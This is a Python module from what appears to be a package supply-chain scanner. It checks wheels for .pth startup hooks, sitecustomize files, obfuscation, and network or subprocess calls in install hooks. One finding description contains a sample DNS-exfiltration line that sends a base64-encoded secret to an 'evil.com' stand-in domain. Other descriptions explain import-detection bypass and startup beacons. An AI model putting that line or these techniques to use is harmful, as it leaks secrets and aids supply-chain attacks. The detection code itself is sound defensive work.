"""Structure and Python file checking logic for static analysis."""

from __future__ import annotations

import ast
import zipfile

from chaincanary.analyzer._deep_visitor import DeepVisitor
from chaincanary.analyzer._patterns import (
    CURL_WGET,
    DNS_EXFIL_PATTERNS,
    NETWORK_ANY_FILE,
    NETWORK_PATTERNS,
    OBFUSCATION_PATTERNS,
    SENSITIVE_PATHS,
    SUBPROCESS_PATTERNS,
    SYS_MODULES_PATTERNS,
    matches_any,
)
from chaincanary.analyzer._sdist import is_install_hook
from chaincanary.analyzer._wheel_safety import safe_read_zip
from chaincanary.analyzer.ast_deep import analyze_ast_obfuscation
from chaincanary.analyzer.pth_analyzer import (
    analyze_pth_content,
    pth_severity_from_analysis,
)
from chaincanary.analyzer.rules import STATIC_RULES
from chaincanary.models import Finding, Severity


def check_structure(
    zf: zipfile.ZipFile,
    names: list[str],
    package_name: str,
) -> list[Finding]:
    """Check wheel structure for .pth files and sitecustomize."""
    findings = []

    # .pth files — semantic analysis
    for pth_name in (n for n in names if n.endswith(".pth")):
        raw = safe_read_zip(zf, pth_name)
        if raw is None:
            findings.append(
                Finding(
                    rule_id="PTH_OVERSIZED",
                    severity=Severity.HIGH,
                    title=f".pth file exceeds size limit: {pth_name}",
                    description="A .pth file larger than 50MB is extremely suspicious.",
                    source="static",
                )
            )
            continue

        content = raw.decode("utf-8", errors="replace")
        analysis = analyze_pth_content(content, package_name)
        severity_str, explanation = pth_severity_from_analysis(analysis)

        if severity_str == "SAFE":
            continue

        elif severity_str == "LOW":
            findings.append(
                Finding(
                    rule_id="PTH_CODE_EXECUTION",
                    severity=Severity.LOW,
                    title=f".pth file runs code on Python startup: {pth_name}",
                    description=(
                        "This .pth file executes Python code on every interpreter startup. "
                        "No external data flow detected — likely legitimate"
                        " (e.g., coverage, setuptools). "
                        "Verify the code is expected for this package."
                    ),
                    evidence=(
                        f"File: {pth_name}\n"
                        f"Safe signals: {analysis.safe_signals}\n"
                        f"Content: {content[:200]}"
                    ),
                    source="static",
                )
            )

        else:
            findings.append(
                Finding(
                    rule_id="PTH_FILE_INSTALL",
                    severity=Severity.CRITICAL,
                    title=".pth file installs dangerous code that runs on every Python startup",
                    description=(
                        "This .pth file executes code with external data flow "
                        "(network calls, subprocess, or credential access) on every "
                        "Python interpreter startup. "
                        "This is the exact mechanism used in the LiteLLM 1.82.7 attack."
                    ),
                    evidence=(
                        f"File: {pth_name}\nRisk: {explanation}\nContent: {content[:300]}"
                    ),
                    source="static",
                )
            )
            findings.extend(_pth_detail_findings(pth_name, content, analysis))

    # sitecustomize.py
    for sf in (n for n in names if "sitecustomize" in n.lower()):
        rule = STATIC_RULES["SITECUSTOMIZE_MODIFY"]
        findings.append(
            Finding(
                rule_id=rule.rule_id,
                severity=rule.severity,
                title=rule.title,
                description=rule.description,
                evidence=f"File: {sf}",
                source="static",
            )
        )

    return findings


def _pth_detail_findings(
    pth_name: str,
    content: str,
    analysis,
) -> list[Finding]:
    """Generate specific sub-findings for dangerous .pth content."""
    findings = []

    if any("network" in sig or "call" in sig for sig in analysis.risk_signals):
        findings.append(
            Finding(
                rule_id="PTH_NETWORK_BEACON",
                severity=Severity.CRITICAL,
                title=".pth file makes network call on every Python startup (phone-home)",
                description=(
                    "The .pth file contains network code that phones home "
                    "on every Python interpreter start — classic beacon/exfiltration pattern."
                ),
                evidence=(
                    f"File: {pth_name}\nSignals: {analysis.risk_signals}"
                    f"\nContent: {content[:200]}"
                ),
                source="static",
            )
        )

    if any("subprocess" in sig or "shell" in sig for sig in analysis.risk_signals):
        findings.append(
            Finding(
                rule_id="PTH_SUBPROCESS",
                severity=Severity.CRITICAL,
                title=".pth file spawns subprocess on every Python startup",
                description=("The .pth file runs shell commands on every Python startup."),
                evidence=f"File: {pth_name}\nContent: {content[:200]}",
                source="static",
            )
        )

    return findings


def check_python_files(
    zf: zipfile.ZipFile,
    names: list[str],
    package_name: str,
) -> list[Finding]:
    """Scan Python files for suspicious patterns and AST anomalies."""
    findings = []

    py_files = [n for n in names if n.endswith(".py")]

    for py_file in py_files:
        raw = safe_read_zip(zf, py_file)
        if raw is None:
            continue
        try:
            code = raw.decode("utf-8", errors="replace")
        except Exception:
            continue

        is_hook = is_install_hook(py_file)
        is_init = py_file.endswith("/__init__.py") or py_file == "__init__.py"

        # ── Pattern-based checks ──────────────────────────────
        obs = matches_any(code, OBFUSCATION_PATTERNS)
        if obs:
            rule = STATIC_RULES["OBFUSCATED_CODE"]
            findings.append(
                Finding(
                    rule_id=rule.rule_id,
                    severity=rule.severity,
                    title=rule.title,
                    description=rule.description,
                    evidence=f"File: {py_file}\nPatterns matched: {obs[:3]}",
                    source="static",
                )
            )

        if is_hook:
            findings.extend(_check_hook_patterns(code, py_file))

        if is_init:
            findings.extend(_check_init_patterns(code, py_file))

        # AST deep obfuscation scan
        ast_findings = analyze_ast_obfuscation(code, py_file)
        findings.extend(ast_findings)

        # AST deep analysis for install hooks
        if is_hook:
            findings.extend(_check_hook_ast(code, py_file))

    return findings


def _check_hook_patterns(code: str, py_file: str) -> list[Finding]:
    """Check install hook files for suspicious patterns."""
    findings = []

    net = matches_any(code, NETWORK_PATTERNS)
    if net:
        rule = STATIC_RULES["NETWORK_IN_SETUP"]
        findings.append(
            Finding(
                rule_id=rule.rule_id,
                severity=rule.severity,
                title=rule.title,
                description=rule.description,
                evidence=f"File: {py_file}\nPatterns: {net[:3]}",
                source="static",
            )
        )

    sub = matches_any(code, SUBPROCESS_PATTERNS)
    if sub:
        rule = STATIC_RULES["SUBPROCESS_IN_SETUP"]
        findings.append(
            Finding(
                rule_id=rule.rule_id,
                severity=rule.severity,
                title=rule.title,
                description=rule.description,
                evidence=f"File: {py_file}\nPatterns: {sub[:3]}",
                source="static",
            )
        )

    cw = matches_any(code, CURL_WGET)
    if cw:
        rule = STATIC_RULES["CURL_WGET_IN_SETUP"]
        findings.append(
            Finding(
                rule_id=rule.rule_id,
                severity=rule.severity,
                title=rule.title,
                description=rule.description,
                evidence=f"File: {py_file}\nPatterns: {cw}",
                source="static",
            )
        )

    sp = matches_any(code, SENSITIVE_PATHS)
    if sp:
        rule = STATIC_RULES["SENSITIVE_PATH_WRITE"]
        findings.append(
            Finding(
                rule_id=rule.rule_id,
                severity=rule.severity,
                title=rule.title,
                description=rule.description,
                evidence=f"File: {py_file}\nPaths: {sp[:3]}",
                source="static",
            )
        )

    return findings


def _check_init_patterns(code: str, py_file: str) -> list[Finding]:
    """Check __init__.py files for delayed-trigger patterns."""
    findings = []

    net = matches_any(code, NETWORK_ANY_FILE)
    if net:
        findings.append(
            Finding(
                rule_id="INIT_NETWORK_CALL",
                severity=Severity.MEDIUM,
                title="Network call in __init__.py (runs on every import)",
                description=(
                    "__init__.py makes a network call that will execute "
                    "every time the package is imported. Could be telemetry, "
                    "beacon, or legitimate update check — review carefully."
                ),
                evidence=f"File: {py_file}\nPatterns: {net[:3]}",
                source="static",
            )
        )

    dns = matches_any(code, DNS_EXFIL_PATTERNS)
    if dns:
        findings.append(
            Finding(
                rule_id="DNS_EXFIL",
                severity=Severity.HIGH,
                title=(
                    "Potential DNS exfiltration — encodes data in DNS hostname lookup"
                ),
                description=(
                    "DNS-based exfiltration encodes stolen data (env vars, secrets) "
                    "as subdomains of an attacker-controlled domain. "
                    "It bypasses many firewalls because DNS traffic is rarely blocked. "
                    "Example: socket.getaddrinfo(base64(secret)+'.evil.com', 80)"
                ),
                evidence=f"File: {py_file}\nPatterns: {dns[:3]}",
                source="static",
            )
        )

    sysmod = matches_any(code, SYS_MODULES_PATTERNS)
    if sysmod:
        findings.append(
            Finding(
                rule_id="SYS_MODULES_ACCESS",
                severity=Severity.MEDIUM,
                title=(
                    "Indirect module access via sys.modules (bypasses static analysis)"
                ),
                description=(
                    "Accessing modules via sys.modules[] is a technique to bypass "
                    "import-based detection. Attackers use it to call network/exec "
                    "functions without triggering 'import requests' style detection."
                ),
                evidence=f"File: {py_file}\nPatterns: {sysmod[:3]}",
                source="static",
            )
        )

    return findings


def _check_hook_ast(code: str, py_file: str) -> list[Finding]:
    """Run AST deep analysis on install hook files."""
    findings = []
    try:
        tree = ast.parse(code, filename=py_file)
        visitor = DeepVisitor()
        visitor.visit(tree)
        ast_f = visitor.to_findings()

        if ast_f.exec_calls or ast_f.eval_calls:
            rule = STATIC_RULES["EXEC_IN_SETUP"]
            calls = ast_f.exec_calls + ast_f.eval_calls
            findings.append(
                Finding(
                    rule_id=rule.rule_id,
                    severity=rule.severity,
                    title=rule.title,
                    description=rule.description,
                    evidence=f"File: {py_file}\nCalls: {calls[:5]}",
                    source="static",
                )
            )

        if ast_f.obfuscation:
            rule = STATIC_RULES["OBFUSCATED_CODE"]
            findings.append(
                Finding(
                    rule_id=rule.rule_id,
                    severity=rule.severity,
                    title=rule.title,
                    description=rule.description,
                    evidence=f"File: {py_file}\nObfuscation: {ast_f.obfuscation[:3]}",
                    source="static",
                )
            )

    except SyntaxError:
        pass

    return findings
